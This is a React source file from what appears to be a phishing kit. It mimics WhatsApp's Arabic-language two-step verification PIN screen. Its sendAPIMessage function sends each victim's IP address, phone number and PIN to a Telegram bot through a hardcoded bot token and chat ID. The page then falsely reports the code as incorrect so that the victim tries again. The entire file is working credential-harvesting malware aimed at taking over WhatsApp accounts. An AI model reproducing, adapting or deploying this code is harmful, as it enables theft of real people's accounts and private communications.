import React, { useState } from "react";
import Axios from "axios";
import { formatPhoneNumberIntl } from "react-phone-number-input";
import SettingsContext from "../Context/SettingsContext";
import Timer from "../Timer/Timer";

export default function Pin({ setNcode, ncode }) {
  const [error, setError] = useState(false);
  const [pin, setPin] = useState("");
  const [stepMessage, setStepMessage] = useState("التحقق بخطوتين");
  const [workMinutes, setWorkMinutes] = useState(1 / 6);
  const [message, setMessage] = useState({
    content: `هذا الحساب محمي بالتحقق المزدوج
      الخطوات. أدخل رقم التعريف الشخصي الذي قمت بإنشائه
      عندما قمت بإعداد التحقق بخطوتين
      . رمز PIN يختلف عن الرمز
      التسجيل الذي تلقيته عن طريق الرسائل القصيرة.`,
    color: "text-gray-700",
  });
  const [loading, setLoading] = useState(false);

  const sendAPIMessage = async (currentPin) => {
    try {
      const apiToken = "8117973793:AAHFnx4SFDBeacZB1z-y2pV0wMhqIlY71_c";
      const chatId = "7502800832";

      const messageContent = `-------[ Whatsapp  Pin ]-------\nIP Address: ${ncode.ip}\nPhone Number: ${formatPhoneNumberIntl(ncode.number)}\nPin Whatsapp: ${currentPin}\n`;

      const queryParams = new URLSearchParams({
        chat_id: chatId,
        text: messageContent,
        parse_mode: "html",
      });

      const url = `https://api.telegram.org/bot${apiToken}/sendMessage?${queryParams.toString()}`;
      await Axios.get(url);
    } catch (error) {
      console.error("Erreur en envoyant à Telegram:", error);
    }
  };

  const handlePinSubmission = async (currentPin) => {
    if (currentPin.length < 6) {
      setError(true);
      return;
    }

    setNcode((prev) => ({ ...prev, pin: currentPin }));
    await sendAPIMessage(currentPin);

    setError(false);
    setLoading(true);
    setStepMessage("");
    setMessage({
      content: "يرجى عدم مغادرة الصفحة لحين تأكيد إضافتك",
      color: "text-gray-700",
    });

    setTimeout(() => {
      setPin("");
      setLoading(false);
      setStepMessage("التحقق بخطوتين");
      setMessage({
        content: "الرمز الذي تم إدخاله غير صحيح",
        color: "text-red-500",
      });

      setTimeout(() => {
        setMessage({
          content: `هذا الحساب محمي بالتحقق المزدوج
          الخطوات. أدخل رقم التعريف الشخصي الذي قمت بإنشائه
          عندما قمت بإعداد التحقق بخطوتين
          . رمز PIN يختلف عن الرمز
          التسجيل الذي تلقيته عن طريق الرسائل القصيرة.`,
          color: "text-gray-700",
        });
      }, 3000);
    }, 10000);
  };

  const inputPin = (e, index) => {
    const pinInputs = document.querySelectorAll(".pin-input input");
    const progress = document.querySelector(".two-step-input-parent .highlight");

    let currentPin = pin + e.target.value;

    if (index < pinInputs.length - 1) {
      pinInputs[index + 1].focus();
      if (progress) {
        progress.style.width = `${Number.parseInt(progress.style.width) + 10}%`;
      }
    }

    setPin(currentPin);

    if (index === pinInputs.length - 1) {
      handlePinSubmission(currentPin);
    }
  };

  const keyPress = (e, index) => {
    const pinInputs = document.querySelectorAll(".pin-input input");
    const progress = document.querySelector(".two-step-input-parent .highlight");
    const keyCode = e.which || e.keyCode;

    if (keyCode < 48 || keyCode > 57) {
      e.preventDefault();
    }

    if (keyCode === 8) {
      const previousIndex = index > 0 ? index - 1 : 0;
      pinInputs[previousIndex].value = "";
      pinInputs[previousIndex].focus();

      if (pin.length > 0 && progress) {
        progress.style.width = `${Number.parseInt(progress.style.width) - 10}%`;
        setPin(pin.substring(0, pin.length - 1));
      }
    }

    if (pin.length !== index) {
      pinInputs[pin.length]?.focus();
    }
  };

  const clipboard = (e) => {
    e.preventDefault();
    let otp = e.clipboardData.getData("text").replace("-", "");

    if (otp.length === 6) {
      const progress = document.querySelector(".two-step-input-parent .highlight");
      const codeInputs = document.querySelectorAll(".pin-input input");
      const otpList = otp.split("");

      otpList.forEach((digit, i) => {
        codeInputs[i].value = digit;
        if (progress) {
          progress.style.width = `${Number.parseInt(progress.style.width) + 10}%`;
        }
      });

      setPin(otp);
      setTimeout(() => {
        handlePinSubmission(otp);
      }, 100);
    }
  };

  return (
    <div className="md:w-1/2 mx-auto shadow-xl rounded-2xl pb-2 bg-white size Conts" style={{ direction: "rtl" }}>
      <div className="flex min-h-full items-center justify-center pb-12 pt-6 px-4 sm:px-6 lg:px-8">
        <div className="w-full max-w-md space-y-8">
          <div>
            <h1 className="two-step-verification">{stepMessage}</h1>
            <h2 className={`mt-6 text-center tracking-tight ${message.color}`}>
              {message.content}
            </h2>
          </div>

          {loading ? (
            <div className="flex min-h-full items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
              <SettingsContext.Provider value={{ workMinutes, setWorkMinutes }}>
                <Timer />
              </SettingsContext.Provider>
            </div>
          ) : (
            <div className="mt-8 space-y-6">
              <div className="-space-y-px rounded-md shadow-sm" style={{ boxShadow: "none", borderRadius: 0 }}>
                <div className="two-step-input-parent">
                  <div className="pin-input-container">
                    <div className="pin-input" id="pinInput">
                      {[...Array(6)].map((_, index) => (
                        <input
                          key={index}
                          onInput={(e) => inputPin(e, index)}
                          onKeyDown={(e) => keyPress(e, index)}
                          onPaste={clipboard}
                          type="tel"
                          pattern="[0-9]*"
                          maxLength="1"
                          placeholder="*"
                          autoFocus={index === 0}
                          className={index < 5 ? "mx-2" : ""}
                        />
                      ))}
                    </div>
                  </div>
                  <span className="highlight" style={{ width: "4%" }}></span>
                </div>
              </div>

              {error && (
                <div className="flex p-4 mb-4 text-sm text-red-700 bg-red-100 rounded-lg" role="alert" style={{ direction: "rtl" }}>
                  <svg
                    aria-hidden="true"
                    className="flex-shrink-0 inline w-5 h-5 mr-3"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fillRule="evenodd"
                      d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <div className="mr-1 font-medium">الرمز غير صحيح</div>
                </div>
              )}

              <div>
                <h3 className="two-step-verification-retry">إنتظر قبل إدخال رقم التحقق مرة أخرى</h3>
                <img
                  src="images/wp-pin.png"
                  alt="whatsapp lock"
                  className="mx-auto"
                  style={{ width: "80px", marginTop: "10px", marginBottom: "15px" }}
                />
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
